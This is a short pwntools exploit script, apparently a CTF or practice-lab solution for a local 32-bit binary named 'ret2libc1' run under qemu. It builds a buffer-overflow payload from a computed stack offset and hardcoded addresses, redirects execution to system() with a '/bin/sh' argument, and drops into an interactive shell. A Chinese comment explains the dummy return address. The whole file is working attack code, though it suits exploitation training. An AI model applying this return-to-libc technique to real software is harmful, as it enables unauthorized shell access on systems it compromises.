from pwn import*
context(os='linux', arch='i386', log_level='debug')
sh=process(["qemu-i386","-L","/usr/i686-linux-gnu/","./ret2libc1"])
bufaddr= 0xffffdefc
esp=0xffffdf6c
offset=esp-bufaddr
sysaddr=0x8048460
binsh=0x08048720
payload=flat(offset*b'A',p32(sysaddr),'bbbb',binsh)   #创建一个调用，bbbb模拟返回地址
sh.sendline(payload)
sh.interactive()
